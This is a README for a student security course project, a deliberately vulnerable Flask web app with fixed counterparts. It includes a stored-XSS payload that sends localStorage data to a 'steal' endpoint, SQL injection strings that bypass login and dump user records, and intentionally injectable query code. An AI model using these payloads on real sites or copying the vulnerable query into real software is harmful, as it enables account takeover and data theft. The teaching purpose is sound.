# CYB3801 Final Project

A deliberately vulnerable web application paired with a mitigated version for
each vulnerability. Built with Flask and SQLite.

**Team:** Bryson Noble, Katherine Kennedy, Neva Ildem

| Member | Vulnerability | Mitigation | Status |
| --- | --- | --- | --- |
| Bryson Noble | Sensitive data stored in `localStorage` + JS-readable cookie, stolen via XSS | Store data server-side in SQLite; opaque `httpOnly` session cookie; escape user input | Done |
| Katherine Kennedy | Insecure Direct Object Reference (IDOR) | Server-side authorization checks | TODO |
| Neva Ildem | SQL Injection | Parameterized queries + input validation | TODO |

## Running it

### With Docker

```bash
docker build -t cyb3801 .
docker run --rm -p 5000:5000 cyb3801
```

### Without Docker

```bash
pip install -r requirements.txt
python app.py
```

Then open http://localhost:5000.

Demo logins: `alice / password123` or `bob / hunter2`.

## Bryson Noble — Sensitive data in localStorage & cookies (XSS)

**Vulnerable** (`/bryson/vulnerable`): after logging in, the browser stores the
full sensitive profile (email, SSN, balance, token) in `localStorage` and a
JS-readable cookie. The public comment wall renders comments without escaping,
so a stored-XSS payload such as

```html
<img src=x onerror="fetch('/bryson/steal?d='+encodeURIComponent(localStorage.getItem('profile')))">
```

reads the stored data and exfiltrates it to the attacker's `/bryson/steal`
endpoint (visible in the container logs).

**Mitigated** (`/bryson/mitigated`): the sensitive data stays in SQLite. The
browser only receives an opaque session id in an `httpOnly`, `SameSite=Strict`
cookie, so JavaScript cannot read it, and `localStorage` holds nothing
sensitive. Comments are auto-escaped by Jinja, so the payload renders as inert
text.

## Neva Ildem — SQL Injection

**Vulnerable** (`/neva/vulnerable`): the login query is built by concatenating
user input directly into the SQL string:

```python
query = ("SELECT username, email, ssn, balance FROM users "
         "WHERE username = '" + username + "' AND password = '" + password + "'")
```

Because the input becomes part of the command, a crafted username in the login
form (any password) rewrites the query:

- `alice' --` closes the username string and comments out the password check,
  logging in as alice without her password.
- `' OR 1=1 --` makes the WHERE clause always true, dumping every user's
  record — usernames, emails, SSNs, and balances.

**Mitigated** (`/neva/mitigated`): the query uses a parameterized statement
(`WHERE username = ? AND password = ?`) via the shared `find_user` helper, so
input is treated as data and can never alter the command. As defense in depth,
usernames are validated against `^[A-Za-z0-9_]{1,32}$` and rejected if they
contain quotes, spaces, or dashes. The same payloads are now rejected, while
valid credentials still log in normally.

## For teammates

Add your routes in the clearly marked sections at the bottom of `app.py` and
drop any templates in `templates/`. The SQLite database lives in the directory
named by `BURPLAB_STATE` (`/state` in Docker).
